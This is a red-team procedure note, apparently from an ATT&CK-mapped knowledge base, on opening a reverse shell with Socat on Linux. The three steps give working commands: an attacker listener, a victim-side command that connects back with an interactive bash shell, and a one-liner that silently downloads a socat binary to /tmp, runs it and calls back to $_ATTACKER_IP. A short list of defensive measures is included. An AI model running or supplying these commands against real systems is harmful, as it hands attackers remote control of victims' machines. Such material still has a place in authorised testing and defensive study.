---
id: 5a5024c5-6736-435a-a607-0e826c7d1a00
name: Establish-Reverse-Shell-Using-Socat
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:24.204683+00:00'
updated_at: '2023-04-10T20:25:32.730778+00:00'
tactics:
  - '[[tactics/Command and Control|TA0011 - Command and Control]]'
techniques:
  - '[[techniques/Remote Access Tools|T1219 - Remote Access Tools]]'
sub_techniques: []
tags:
  - reverse-shell
  - socat
commands:
  - '[[commands/socat-attacker-listener]]'
  - '[[commands/socat-victim-connect-installed]]'
  - '[[commands/download-and-execute-socat-reverse-shell]]'
platforms:
  - Linux
tools:
  - '[[tools/Socat]]'
validated: true
---

# Establish-Reverse-Shell-Using-Socat

## Summary

This procedure outlines how to establish a reverse shell connection from a target machine to an attacker-controlled machine using Socat, a versatile networking tool. It covers setting up the listener on the attacker side and connecting from the victim side, either using a pre-installed Socat binary or by downloading it dynamically. This technique allows remote command execution on the target and is commonly used in post-exploitation scenarios for command and control.

## Description

Socat (short for SOcket CAT) is a command-line utility that establishes bidirectional byte streams and transfers data between them, making it ideal for creating reverse shells without relying on tools like Netcat. In a reverse shell, the target (victim) initiates the outbound connection to the attacker, bypassing inbound firewall restrictions. This procedure assumes a Linux environment on both sides and requires network connectivity between the machines. The attacker sets up a listening socket, and the victim connects back, spawning an interactive Bash shell. If Socat is not installed on the victim, it can be downloaded from a trusted static binary repository. This maps to MITRE ATT&CK for remote access and command execution in compromised environments.

## Requirements

1. Command-line access on the target (victim) machine, typically via initial foothold like SSH or another shell.
2. Socat installed on the attacker machine; on the victim, either pre-installed or ability to download and execute binaries (writable /tmp directory).
3. Network connectivity allowing outbound TCP from victim to attacker (common ports like 4242 should be open on attacker's firewall).
4. Knowledge of attacker's IP address and chosen port.

## Defense

- Restrict outbound connections from internal systems using firewalls or network segmentation to block connections to unauthorized IPs/ports.
- Monitor for downloads of unusual binaries (e.g., wget/curl to external repos) and executions from temporary directories like /tmp.
- Implement application whitelisting to prevent execution of unapproved tools like Socat.
- Enable logging for process creation, network connections, and file downloads; look for indicators like 'socat' in command lines or unexpected TCP connections.

## Objectives

1. Establish a persistent reverse shell for remote command execution on the target machine.
2. Provide fallback method for victims without Socat installed by dynamically downloading it.
3. Verify shell interactivity and stability for further post-exploitation activities.

## Instructions

### Step 1: Set Up Listener on Attacker Machine

**Context**: Start a Socat listener to accept the incoming reverse connection from the victim. This creates a raw TTY interface for interactive shell use.

**Command** ([[commands/socat-attacker-listener]]):
```bash
socat file:`tty`,raw,echo=0 TCP-L:$_PORT
```

> This command binds Socat to the specified port on the attacker machine, configuring it for raw TTY input/output without echo for clean shell interaction. Replace $_PORT with your chosen port (e.g., 4242). Expected output is a message indicating the listener is active, waiting for a connection. Once connected, you'll see the victim's shell prompt.

### Step 2: Connect from Victim Machine (If Socat Installed)

**Context**: If Socat is already available on the victim (e.g., at /tmp/socat or in PATH), use this to initiate the reverse connection and spawn an interactive Bash shell.

**Command** ([[commands/socat-victim-connect-installed]]):
```bash
/tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$_ATTACKER_IP:$_PORT
```

> This executes Socat on the victim to connect back to the attacker, spawning a login-interactive Bash shell with pseudo-TTY allocation for full interactivity. The options ensure proper signal handling and error redirection. Replace $_ATTACKER_IP and $_PORT accordingly. Expected output on the attacker side is the shell prompt (e.g., user@victim$); test by running commands like 'whoami' or 'id'.

### Step 3: Download and Execute Socat on Victim (If Not Installed)

**Context**: If Socat is not present, download a static binary for Linux x86_64, make it executable, and immediately use it to establish the reverse shell. This is a common evasion technique in restricted environments.

**Command** ([[commands/download-and-execute-socat-reverse-shell]]):
```bash
wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$_ATTACKER_IP:$_PORT
```

> This one-liner downloads the Socat binary silently (-q flag), saves it to /tmp, sets execute permissions, and runs the reverse shell command. It's designed for environments without package managers. Expected output mirrors Step 2; the binary remains in /tmp post-execution for reuse if needed. Verify by checking the connection on the attacker side.
